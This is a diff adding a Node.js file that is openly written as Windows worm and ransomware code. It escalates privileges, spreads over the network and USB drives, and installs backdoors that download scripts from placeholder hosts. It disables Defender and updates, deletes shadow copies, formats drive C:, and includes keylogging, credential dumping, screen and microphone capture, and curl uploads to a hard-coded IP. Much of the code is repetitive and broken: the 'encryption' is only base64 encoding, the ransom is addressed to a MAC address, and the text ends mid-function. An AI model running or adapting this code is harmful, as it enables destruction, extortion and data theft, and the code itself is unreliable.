@@ -1,0 +1,1301 @@
+const { exec } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+
+// Check if the script is running with administrative privileges
+function checkAdmin() {
+    exec('net session >nul 2>&1', (error, stdout, stderr) => {
+        if (error) {
+            console.log('Requesting administrative privileges...');
+            exec('powershell -Command "Start-Process \'' + process.argv[0] + '\' -Verb RunAs"', (error) => {
+                if (error) {
+                    console.error('Failed to request administrative privileges:', error);
+                } else {
+                    process.exit(0);
+                }
+            });
+        }
+    });
+}
+
+checkAdmin();
+
+// Variables
+const logfile = 'C:\\wormlog.txt';
+const targetdir = 'C:\\Users';
+const encryptionkey = 'MySecretKey123';
+const remoteaccessport = 4444;
+const remoteaccesspassword = 'Password123';
+const ransomnote = 'C:\\ransom_note.txt';
+const exfiltrationserver = 'http://64.246.123.125:3000/upload';
+const keylogfile = 'C:\\keylogs.txt';
+const credentialfile = 'C:\\credentials.txt';
+const maliciouspayload = 'C:\\malicious_payload.exe';
+const additionalpayload = 'C:\\additional_payload.exe';
+const corruptionfile = 'C:\\corruption_data.bin';
+const screenshotdir = 'C:\\screenshots';
+const micrecordingsdir = 'C:\\micrecordings';
+const webcamvideosdir = 'C:\\webcamvideos';
+const additionalmaliciousfile = 'C:\\additional_malicious_file.exe';
+const additionalcorruptionfile = 'C:\\additional_corruption_data.bin';
+const additionalkeylogfile = 'C:\\additional_keylogs.txt';
+const additionalcredentialfile = 'C:\\additional_credentials.txt';
+const additionalransomnote = 'C:\\additional_ransom_note.txt';
+const additionalexfiltrationserver = 'http://64.246.123.125:3000/upload';
+const additionalmicrecordingsdir = 'C:\\additional_micrecordings';
+const additionalwebcamvideosdir = 'C:\\additional_webcamvideos';
+
+// Function to encrypt files with quintuple encryption
+function encryptfiles() {
+    const files = fs.readdirSync(targetdir);
+    files.forEach(file => {
+        const filePath = path.join(targetdir, file);
+        if (fs.statSync(filePath).isDirectory()) {
+            encryptDirectory(filePath);
+        }
+    });
+}
+
+function encryptDirectory(dir) {
+    const files = fs.readdirSync(dir);
+    files.forEach(file => {
+        const filePath = path.join(dir, file);
+        if (fs.statSync(filePath).isFile()) {
+            const ext = path.extname(filePath).toLowerCase();
+            if (['.txt', '.docx', '.xlsx', '.pptx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip'].includes(ext)) {
+                encryptFile(filePath);
+            }
+        }
+    });
+}
+
+function encryptFile(filePath) {
+    const encryptedPath = filePath + '.enc';
+    exec(`certutil -encode "${filePath}" "${encryptedPath}"`, (error) => {
+        if (error) {
+            console.error('Error encrypting file:', error);
+        } else {
+            fs.unlinkSync(filePath);
+            const nextEncryptedPath = encryptedPath + '2';
+            exec(`certutil -encode "${encryptedPath}" "${nextEncryptedPath}"`, (error) => {
+                if (error) {
+                    console.error('Error encrypting file:', error);
+                } else {
+                    fs.unlinkSync(encryptedPath);
+                    const nextNextEncryptedPath = nextEncryptedPath + '3';
+                    exec(`certutil -encode "${nextEncryptedPath}" "${nextNextEncryptedPath}"`, (error) => {
+                        if (error) {
+                            console.error('Error encrypting file:', error);
+                        } else {
+                            fs.unlinkSync(nextEncryptedPath);
+                            const nextNextNextEncryptedPath = nextNextEncryptedPath + '4';
+                            exec(`certutil -encode "${nextNextEncryptedPath}" "${nextNextNextEncryptedPath}"`, (error) => {
+                                if (error) {
+                                    console.error('Error encrypting file:', error);
+                                } else {
+                                    fs.unlinkSync(nextNextEncryptedPath);
+                                    const finalEncryptedPath = nextNextNextEncryptedPath + '5';
+                                    exec(`certutil -encode "${nextNextNextEncryptedPath}" "${finalEncryptedPath}"`, (error) => {
+                                        if (error) {
+                                            console.error('Error encrypting file:', error);
+                                        } else {
+                                            fs.unlinkSync(nextNextNextEncryptedPath);
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to spread over the network with enhanced stealth and additional methods
+function spreadnetwork() {
+    exec('wmic logicaldisk where "drivetype=3" get deviceid /format:list', (error, stdout, stderr) => {
+        if (error) {
+            console.error('Error getting logical disks:', error);
+        } else {
+            const drives = stdout.split('\n').filter(line => line.includes(':'));
+            drives.forEach(drive => {
+                const driveLetter = drive.split(':')[0];
+                if (driveLetter !== process.env.currentdrive) {
+                    const targetPath = `\\\\${driveLetter}\\C$\\${path.basename(process.argv[0])}`;
+                    exec(`xcopy /y /q "${process.argv[0]}" "${targetPath}"`, (error) => {
+                        if (error) {
+                            console.error('Error copying file:', error);
+                        } else {
+                            exec(`attrib +h "${targetPath}"`, (error) => {
+                                if (error) {
+                                    console.error('Error setting attributes:', error);
+                                } else {
+                                    exec(`powershell -Command "Invoke-Command -ComputerName ${driveLetter} -ScriptBlock {Copy-Item -Path 'C:\\path\\to\\your\\worm.bat' -Destination 'C:\\' -Force}"`, (error) => {
+                                        if (error) {
+                                            console.error('Error invoking command:', error);
+                                        } else {
+                                            exec(`powershell -Command "Invoke-Command -ComputerName ${driveLetter} -ScriptBlock {schtasks /create /tn 'NetworkSpreadTask' /tr 'C:\\path\\to\\your\\worm.bat' /sc daily /st 00:00}"`, (error) => {
+                                                if (error) {
+                                                    console.error('Error creating task:', error);
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to spread via USB with enhanced stealth and additional methods
+function spreadusb() {
+    exec('wmic logicaldisk where "drivetype=2" get deviceid /format:list', (error, stdout, stderr) => {
+        if (error) {
+            console.error('Error getting logical disks:', error);
+        } else {
+            const drives = stdout.split('\n').filter(line => line.includes(':'));
+            drives.forEach(drive => {
+                const targetPath = `${drive}:\\${path.basename(process.argv[0])}`;
+                exec(`xcopy /y /q "${process.argv[0]}" "${targetPath}"`, (error) => {
+                    if (error) {
+                        console.error('Error copying file:', error);
+                    } else {
+                        exec(`attrib +h "${targetPath}"`, (error) => {
+                            if (error) {
+                                console.error('Error setting attributes:', error);
+                            } else {
+                                exec(`powershell -Command "Copy-Item -Path 'C:\\path\\to\\your\\worm.bat' -Destination '${drive}:' -Force"`, (error) => {
+                                    if (error) {
+                                        console.error('Error copying item:', error);
+                                    } else {
+                                        exec(`powershell -Command "schtasks /create /tn 'USBSpreadTask' /tr 'C:\\path\\to\\your\\worm.bat' /sc daily /st 00:00"`, (error) => {
+                                            if (error) {
+                                                console.error('Error creating task:', error);
+                                            }
+                                        });
+                                    }
+                                });
+                            }
+                        });
+                    }
+                });
+            });
+        }
+    });
+}
+
+// Function to set up remote access with additional backdoors and persistence
+function setupremoteaccess() {
+    exec(`netsh advfirewall firewall add rule name="Remote Access" dir=in action=allow protocol=TCP localport=${remoteaccessport}`, (error) => {
+        if (error) {
+            console.error('Error adding firewall rule:', error);
+        } else {
+            exec(`net user administrator ${remoteaccesspassword} /domain`, (error) => {
+                if (error) {
+                    console.error('Error setting user password:', error);
+                } else {
+                    exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe" /v "Debugger" /t REG_SZ /d "C:\\backdoor.exe" /f`, (error) => {
+                        if (error) {
+                            console.error('Error adding registry key:', error);
+                        } else {
+                            exec(`schtasks /create /tn "RemoteAccessTask" /tr "powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://yourserver.com/backdoor.ps1'')'" /sc daily /st 00:00`, (error) => {
+                                if (error) {
+                                    console.error('Error creating task:', error);
+                                } else {
+                                    exec(`powershell -Command "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'RemoteAccess' -Value 'powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://yourserver.com/backdoor.ps1'')'"`, (error) => {
+                                        if (error) {
+                                            console.error('Error setting registry property:', error);
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to disable antivirus and other security software with additional methods
+function disableantivirus() {
+    exec('sc stop WinDefend', (error) => {
+        if (error) {
+            console.error('Error stopping service:', error);
+        } else {
+            exec('sc config WinDefend start= disabled', (error) => {
+                if (error) {
+                    console.error('Error configuring service:', error);
+                } else {
+                    exec('sc stop MpSigStub', (error) => {
+                        if (error) {
+                            console.error('Error stopping service:', error);
+                        } else {
+                            exec('sc config MpSigStub start= disabled', (error) => {
+                                if (error) {
+                                    console.error('Error configuring service:', error);
+                                } else {
+                                    exec('sc stop MsMpEng', (error) => {
+                                        if (error) {
+                                            console.error('Error stopping service:', error);
+                                        } else {
+                                            exec('sc config MsMpEng start= disabled', (error) => {
+                                                if (error) {
+                                                    console.error('Error configuring service:', error);
+                                                } else {
+                                                    exec('powershell -Command "Get-Process | Where-Object { $_.Name -like \'av*\' } | Stop-Process -Force"', (error) => {
+                                                        if (error) {
+                                                            console.error('Error stopping processes:', error);
+                                                        } else {
+                                                            exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'av*\' } | Stop-Service -Force"', (error) => {
+                                                                if (error) {
+                                                                    console.error('Error stopping services:', error);
+                                                                }
+                                                            });
+                                                        }
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to disable Windows Update and other update services with additional methods
+function disablewindowsupdate() {
+    exec('sc stop wuauserv', (error) => {
+        if (error) {
+            console.error('Error stopping service:', error);
+        } else {
+            exec('sc config wuauserv start= disabled', (error) => {
+                if (error) {
+                    console.error('Error configuring service:', error);
+                } else {
+                    exec('sc stop BITS', (error) => {
+                        if (error) {
+                            console.error('Error stopping service:', error);
+                        } else {
+                            exec('sc config BITS start= disabled', (error) => {
+                                if (error) {
+                                    console.error('Error configuring service:', error);
+                                } else {
+                                    exec('sc stop DoSvc', (error) => {
+                                        if (error) {
+                                            console.error('Error stopping service:', error);
+                                        } else {
+                                            exec('sc config DoSvc start= disabled', (error) => {
+                                                if (error) {
+                                                    console.error('Error configuring service:', error);
+                                                } else {
+                                                    exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'wu*\' } | Stop-Service -Force"', (error) => {
+                                                        if (error) {
+                                                            console.error('Error stopping services:', error);
+                                                        } else {
+                                                            exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'Do*\' } | Stop-Service -Force"', (error) => {
+                                                                if (error) {
+                                                                    console.error('Error stopping services:', error);
+                                                                }
+                                                            });
+                                                        }
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to delete shadow copies and system restore points with additional methods
+function deleteshadowcopies() {
+    exec('vssadmin delete shadows /all /quiet', (error) => {
+        if (error) {
+            console.error('Error deleting shadows:', error);
+        } else {
+            exec('wmic ShadowCopy delete', (error) => {
+                if (error) {
+                    console.error('Error deleting shadow copies:', error);
+                } else {
+                    exec('powershell -Command "Get-ComputerRestorePoint | Remove-ComputerRestorePoint -Confirm:$false"', (error) => {
+                        if (error) {
+                            console.error('Error removing restore points:', error);
+                        } else {
+                            exec('powershell -Command "Get-Volume | Where-Object { $_.DriveLetter -eq \'C\' } | ForEach-Object { $_.FileSystemLabel = \'Infected\' }"', (error) => {
+                                if (error) {
+                                    console.error('Error setting volume label:', error);
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to log keystrokes with additional data exfiltration and persistence
+function keylogger() {
+    exec(`powershell -Command "$keylog = New-Object System.Windows.Forms.Keys; Add-Type -AssemblyName System.Windows.Forms; $keylog.Add_KeyDown({param($sender, $e) $keylog.TextBox1.Text += $e.KeyCode.ToString() + ' '}); [System.Windows.Forms.Application]::Run($keylog); $keylog.TextBox1.Text | Out-File -FilePath ${keylogfile}; schtasks /create /tn "KeyloggerTask" /tr "powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://yourserver.com/keylogger.ps1'')'" /sc daily /st 00:00"`, (error) => {
+        if (error) {
+            console.error('Error starting keylogger:', error);
+        }
+    });
+}
+
+// Function to steal credentials with additional methods and persistence
+function stealcredentials() {
+    exec(`cmdkey /list > ${credentialfile}`, (error) => {
+        if (error) {
+            console.error('Error listing credentials:', error);
+        } else {
+            exec(`powershell -Command "Get-StoredCredential | Export-Clixml -Path C:\\storedcredentials.xml; schtasks /create /tn "CredentialStealerTask" /tr "powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://yourserver.com/credentialstealer.ps1'')'" /sc daily /st 00:00"`, (error) => {
+                if (error) {
+                    console.error('Error exporting credentials:', error);
+                } else {
+                    exec(`powershell -Command "Get-Credential | Export-Clixml -Path C:\\additionalcredentials.xml"`, (error) => {
+                        if (error) {
+                            console.error('Error exporting additional credentials:', error);
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to exfiltrate data with additional file types and methods
+function exfiltratedata() {
+    const files = fs.readdirSync(targetdir);
+    files.forEach(file => {
+        const filePath = path.join(targetdir, file);
+        if (fs.statSync(filePath).isDirectory()) {
+            exfiltrateDirectory(filePath);
+        }
+    });
+}
+
+function exfiltrateDirectory(dir) {
+    const files = fs.readdirSync(dir);
+    files.forEach(file => {
+        const filePath = path.join(dir, file);
+        if (fs.statSync(filePath).isFile()) {
+            const ext = path.extname(filePath).toLowerCase();
+            if (['.enc', '.enc2', '.enc3', '.enc4', '.enc5'].includes(ext)) {
+                exfiltrateFile(filePath);
+            }
+        }
+    });
+}
+
+function exfiltrateFile(filePath) {
+    exec(`curl -F "file=@${filePath}" ${exfiltrationserver}`, (error) => {
+        if (error) {
+            console.error('Error exfiltrating file:', error);
+        }
+    });
+}
+
+exec('powershell -Command "Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.docx,*.xlsx,*.pptx,*.pdf,*.jpg,*.png,*.mp3,*.mp4,*.zip | ForEach-Object { $_.FullName } | Out-File -FilePath C:\\exfiltrated_files.txt"', (error) => {
+    if (error) {
+        console.error('Error getting files for exfiltration:', error);
+    } else {
+        exec(`curl -F "file=@C:\\exfiltrated_files.txt" ${exfiltrationserver}`, (error) => {
+            if (error) {
+                console.error('Error exfiltrating files:', error);
+            }
+        });
+    }
+});
+
+// Function to display ransom note with additional threats and persistence
+function displayransomnote() {
+    fs.writeFileSync(ransomnote, `Your files have been encrypted you can't access them without our decryption services. Pay the ransom of $500 in Bitcoin to the MAC address D0:AB:D5:F3:1D:D5. If you do not pay, your data will be permanently deleted and your system will be reformatted. Additionally, your system will be rendered unstable.`);
+    exec(`start notepad ${ransomnote}`, (error) => {
+        if (error) {
+            console.error('Error displaying ransom note:', error);
+        } else {
+            exec(`schtasks /create /tn "RansomNoteTask" /tr "notepad ${ransomnote}" /sc daily /st 00:00`, (error) => {
+                if (error) {
+                    console.error('Error creating task for ransom note:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to ensure persistence with additional methods
+function ensurepersistence() {
+    exec(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Worm" /t REG_SZ /d "${process.argv[0]}" /f`, (error) => {
+        if (error) {
+            console.error('Error adding registry key for persistence:', error);
+        } else {
+            exec(`schtasks /create /tn "WormTask" /tr "${process.argv[0]}" /sc daily /st 00:00`, (error) => {
+                if (error) {
+                    console.error('Error creating task for persistence:', error);
+                } else {
+                    exec(`powershell -Command "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Worm' -Value '${process.argv[0]}'"`, (error) => {
+                        if (error) {
+                            console.error('Error setting registry property for persistence:', error);
+                        } else {
+                            exec(`powershell -Command "New-Item -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force; Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Worm' -Value '${process.argv[0]}'"`, (error) => {
+                                if (error) {
+                                    console.error('Error setting registry property for persistence:', error);
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to execute a malicious payload with additional actions
+function executepayload() {
+    exec(`start "" ${maliciouspayload}`, (error) => {
+        if (error) {
+            console.error('Error executing malicious payload:', error);
+        } else {
+            exec(`powershell -Command "Start-Process 'C:\\additional_payload.exe'"`, (error) => {
+                if (error) {
+                    console.error('Error starting additional payload:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to format the system drive
+function formatdrive() {
+    exec('format C: /y /q', (error) => {
+        if (error) {
+            console.error('Error formatting drive:', error);
+        }
+    });
+}
+
+// Function to corrupt system files
+function corruptsystemfiles() {
+    exec(`powershell -Command "Get-ChildItem -Path 'C:\\Windows\\System32' -Recurse -Include *.dll,*.exe,*.sys | ForEach-Object { $_.FullName } | ForEach-Object { Copy-Item -Path $_ -Destination 'C:\\corruption_data.bin' -Force }"`, (error) => {
+        if (error) {
+            console.error('Error corrupting system files:', error);
+        }
+    });
+}
+
+// Function to induce system instability
+function inducestability() {
+    exec(`powershell -Command "while ($true) { Start-Process 'notepad.exe' }"`, (error) => {
+        if (error) {
+            console.error('Error inducing system instability:', error);
+        }
+    });
+}
+
+// Function to capture screenshots
+function capturescreenshots() {
+    exec(`powershell -Command "Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size); $bitmap.Save('C:\\screenshots\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)"`, (error) => {
+        if (error) {
+            console.error('Error capturing screenshot:', error);
+        } else {
+            exec(`schtasks /create /tn "ScreenshotTask" /tr "powershell -Command 'Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size); $bitmap.Save('C:\\screenshots\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)'" /sc minute /mo 5`, (error) => {
+                if (error) {
+                    console.error('Error creating screenshot task:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to record microphone
+function recordmicrophone() {
+    exec(`powershell -Command "Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognizer; $rec.LoadGrammar(New-Object System.Speech.Recognition.Grammar('C:\\path\\to\\your\\grammar.xml')); $rec.RecognizeAsync(); $rec.SpeechRecognized.Add({param($sender, $e) $e.Result.Text | Out-File -FilePath 'C:\\micrecordings\\microphone.txt' -Append}); while ($true) { Start-Sleep -Seconds 60 }"`, (error) => {
+        if (error) {
+            console.error('Error recording microphone:', error);
+        } else {
+            exec(`schtasks /create /tn "MicrophoneTask" /tr "powershell -Command 'Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognizer; $rec.LoadGrammar(New-Object System.Speech.Recognition.Grammar(''C:\\path\\to\\your\\grammar.xml'')); $rec.RecognizeAsync(); $rec.SpeechRecognized.Add({param($sender, $e) $e.Result.Text | Out-File -FilePath ''C:\\micrecordings\\microphone.txt'' -Append}); while ($true) { Start-Sleep -Seconds 60 }'" /sc minute /mo 5`, (error) => {
+                if (error) {
+                    console.error('Error creating microphone task:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to capture webcam
+function capturewebcam() {
+    exec(`powershell -Command "Add-Type -AssemblyName System.Drawing; $webcam = New-Object System.Drawing.Bitmap(640, 480); $graphics = [System.Drawing.Graphics]::FromImage($webcam); $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $webcam.Size); $webcam.Save('C:\\webcamvideos\\webcam.png', [System.Drawing.Imaging.ImageFormat]::Png)"`, (error) => {
+        if (error) {
+            console.error('Error capturing webcam:', error);
+        } else {
+            exec(`schtasks /create /tn "WebcamTask" /tr "powershell -Command 'Add-Type -AssemblyName System.Drawing; $webcam = New-Object System.Drawing.Bitmap(640, 480); $graphics = [System.Drawing.Graphics]::FromImage($webcam); $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $webcam.Size); $webcam.Save(''C:\\webcamvideos\\webcam.png'', [System.Drawing.Imaging.ImageFormat]::Png)'" /sc minute /mo 5`, (error) => {
+                if (error) {
+                    console.error('Error creating webcam task:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to exfiltrate captured data
+function exfiltratecaptureddata() {
+    const screenshotFiles = fs.readdirSync(screenshotdir);
+    screenshotFiles.forEach(file => {
+        const filePath = path.join(screenshotdir, file);
+        if (fs.statSync(filePath).isFile()) {
+            exec(`curl -F "file=@${filePath}" ${exfiltrationserver}`, (error) => {
+                if (error) {
+                    console.error('Error exfiltrating screenshot:', error);
+                }
+            });
+        }
+    });
+
+    const micRecordingFiles = fs.readdirSync(micrecordingsdir);
+    micRecordingFiles.forEach(file => {
+        const filePath = path.join(micrecordingsdir, file);
+        if (fs.statSync(filePath).isFile()) {
+            exec(`curl -F "file=@${filePath}" ${exfiltrationserver}`, (error) => {
+                if (error) {
+                    console.error('Error exfiltrating microphone recording:', error);
+                }
+            });
+        }
+    });
+
+    const webcamVideoFiles = fs.readdirSync(webcamvideosdir);
+    webcamVideoFiles.forEach(file => {
+        const filePath = path.join(webcamvideosdir, file);
+        if (fs.statSync(filePath).isFile()) {
+            exec(`curl -F "file=@${filePath}" ${exfiltrationserver}`, (error) => {
+                if (error) {
+                    console.error('Error exfiltrating webcam video:', error);
+                }
+            });
+        }
+    });
+}
+
+// Function to encrypt additional files with quintuple encryption
+function encryptadditionalfiles() {
+    const files = fs.readdirSync(targetdir);
+    files.forEach(file => {
+        const filePath = path.join(targetdir, file);
+        if (fs.statSync(filePath).isDirectory()) {
+            encryptAdditionalDirectory(filePath);
+        }
+    });
+}
+
+function encryptAdditionalDirectory(dir) {
+    const files = fs.readdirSync(dir);
+    files.forEach(file => {
+        const filePath = path.join(dir, file);
+        if (fs.statSync(filePath).isFile()) {
+            const ext = path.extname(filePath).toLowerCase();
+            if (['.txt', '.docx', '.xlsx', '.pptx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip'].includes(ext)) {
+                encryptAdditionalFile(filePath);
+            }
+        }
+    });
+}
+
+function encryptAdditionalFile(filePath) {
+    const encryptedPath = filePath + '.enc';
+    exec(`certutil -encode "${filePath}" "${encryptedPath}"`, (error) => {
+        if (error) {
+            console.error('Error encrypting additional file:', error);
+        } else {
+            fs.unlinkSync(filePath);
+            const nextEncryptedPath = encryptedPath + '2';
+            exec(`certutil -encode "${encryptedPath}" "${nextEncryptedPath}"`, (error) => {
+                if (error) {
+                    console.error('Error encrypting additional file:', error);
+                } else {
+                    fs.unlinkSync(encryptedPath);
+                    const nextNextEncryptedPath = nextEncryptedPath + '3';
+                    exec(`certutil -encode "${nextEncryptedPath}" "${nextNextEncryptedPath}"`, (error) => {
+                        if (error) {
+                            console.error('Error encrypting additional file:', error);
+                        } else {
+                            fs.unlinkSync(nextEncryptedPath);
+                            const nextNextNextEncryptedPath = nextNextEncryptedPath + '4';
+                            exec(`certutil -encode "${nextNextEncryptedPath}" "${nextNextNextEncryptedPath}"`, (error) => {
+                                if (error) {
+                                    console.error('Error encrypting additional file:', error);
+                                } else {
+                                    fs.unlinkSync(nextNextEncryptedPath);
+                                    const finalEncryptedPath = nextNextNextEncryptedPath + '5';
+                                    exec(`certutil -encode "${nextNextNextEncryptedPath}" "${finalEncryptedPath}"`, (error) => {
+                                        if (error) {
+                                            console.error('Error encrypting additional file:', error);
+                                        } else {
+                                            fs.unlinkSync(nextNextNextEncryptedPath);
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to spread over the network with enhanced stealth and additional methods
+function spreadadditionalnetwork() {
+    exec('wmic logicaldisk where "drivetype=3" get deviceid /format:list', (error, stdout, stderr) => {
+        if (error) {
+            console.error('Error getting logical disks:', error);
+        } else {
+            const drives = stdout.split('\n').filter(line => line.includes(':'));
+            drives.forEach(drive => {
+                const driveLetter = drive.split(':')[0];
+                if (driveLetter !== process.env.currentdrive) {
+                    const targetPath = `\\\\${driveLetter}\\C$\\${path.basename(process.argv[0])}`;
+                    exec(`xcopy /y /q "${process.argv[0]}" "${targetPath}"`, (error) => {
+                        if (error) {
+                            console.error('Error copying file:', error);
+                        } else {
+                            exec(`attrib +h "${targetPath}"`, (error) => {
+                                if (error) {
+                                    console.error('Error setting attributes:', error);
+                                } else {
+                                    exec(`powershell -Command "Invoke-Command -ComputerName ${driveLetter} -ScriptBlock {schtasks /create /tn 'NetworkSpreadTask' /tr 'C:\\path\\to\\your\\worm.bat' /sc daily /st 00:00}"`, (error) => {
+                                        if (error) {
+                                            console.error('Error invoking command:', error);
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to spread via USB with enhanced stealth and additional methods
+function spreadadditionalusb() {
+    exec('wmic logicaldisk where "drivetype=2" get deviceid /format:list', (error, stdout, stderr) => {
+        if (error) {
+            console.error('Error getting logical disks:', error);
+        } else {
+            const drives = stdout.split('\n').filter(line => line.includes(':'));
+            drives.forEach(drive => {
+                const targetPath = `${drive}:\\${path.basename(process.argv[0])}`;
+                exec(`xcopy /y /q "${process.argv[0]}" "${targetPath}"`, (error) => {
+                    if (error) {
+                        console.error('Error copying file:', error);
+                    } else {
+                        exec(`attrib +h "${targetPath}"`, (error) => {
+                            if (error) {
+                                console.error('Error setting attributes:', error);
+                            } else {
+                                exec(`powershell -Command "Copy-Item -Path 'C:\\path\\to\\your\\worm.bat' -Destination '${drive}:' -Force"`, (error) => {
+                                    if (error) {
+                                        console.error('Error copying item:', error);
+                                    } else {
+                                        exec(`powershell -Command "schtasks /create /tn 'USBSpreadTask' /tr 'C:\\path\\to\\your\\worm.bat' /sc daily /st 00:00"`, (error) => {
+                                            if (error) {
+                                                console.error('Error creating task:', error);
+                                            }
+                                        });
+                                    }
+                                });
+                            }
+                        });
+                    }
+                });
+            });
+        }
+    });
+}
+
+// Function to set up additional remote access with backdoors and persistence
+function setupadditionalremoteaccess() {
+    exec(`netsh advfirewall firewall add rule name="AdditionalRemoteAccess" dir=in action=allow protocol=TCP localport=4445`, (error) => {
+        if (error) {
+            console.error('Error adding firewall rule:', error);
+        } else {
+            exec(`net user administrator AdditionalPassword123 /domain`, (error) => {
+                if (error) {
+                    console.error('Error setting user password:', error);
+                } else {
+                    exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe" /v "AdditionalDebugger" /t REG_SZ /d "C:\\additional_backdoor.exe" /f`, (error) => {
+                        if (error) {
+                            console.error('Error adding registry key:', error);
+                        } else {
+                            exec(`schtasks /create /tn "AdditionalRemoteAccessTask" /tr "powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://additionalserver.com/backdoor.ps1'')'" /sc daily /st 00:00`, (error) => {
+                                if (error) {
+                                    console.error('Error creating task:', error);
+                                } else {
+                                    exec(`powershell -Command "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'AdditionalRemoteAccess' -Value 'powershell -Command 'iex(New-Object System.Net.WebClient).DownloadString(''http://additionalserver.com/backdoor.ps1'')'"`, (error) => {
+                                        if (error) {
+                                            console.error('Error setting registry property:', error);
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to disable additional antivirus and security software
+function disableadditionalantivirus() {
+    exec('sc stop AdditionalWinDefend', (error) => {
+        if (error) {
+            console.error('Error stopping service:', error);
+        } else {
+            exec('sc config AdditionalWinDefend start= disabled', (error) => {
+                if (error) {
+                    console.error('Error configuring service:', error);
+                } else {
+                    exec('sc stop AdditionalMpSigStub', (error) => {
+                        if (error) {
+                            console.error('Error stopping service:', error);
+                        } else {
+                            exec('sc config AdditionalMpSigStub start= disabled', (error) => {
+                                if (error) {
+                                    console.error('Error configuring service:', error);
+                                } else {
+                                    exec('sc stop AdditionalMsMpEng', (error) => {
+                                        if (error) {
+                                            console.error('Error stopping service:', error);
+                                        } else {
+                                            exec('sc config AdditionalMsMpEng start= disabled', (error) => {
+                                                if (error) {
+                                                    console.error('Error configuring service:', error);
+                                                } else {
+                                                    exec('powershell -Command "Get-Process | Where-Object { $_.Name -like \'additionalav*\' } | Stop-Process -Force"', (error) => {
+                                                        if (error) {
+                                                            console.error('Error stopping processes:', error);
+                                                        } else {
+                                                            exec('powershell -Command "Get-Service | Where-Object { $_.Name -like \'additionalav*\' } | Stop-Service -Force"', (error) => {
+                                                                if (error) {
+                                                                    console.error('Error stopping services:', error);
+                                                                }
+                                                            });
+                                                        }
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+    });
+}
+
+// Function to disable additional Windows Update and update services
+function disableadditionalwindowsupdate() {
+    exec('sc stop additionalwuauserv', (error) => {
+        if (error) {
+            console.error('Error stopping service:', error);
+        } else {
+            exec('sc config additionalwuauserv start= disabled', (error) => {
+                if (error) {
+                    console.error('Error configuring service:', error);
+                } else {
+                    exec('sc stop additionalBITS', (error) => {
+                        if (error) {
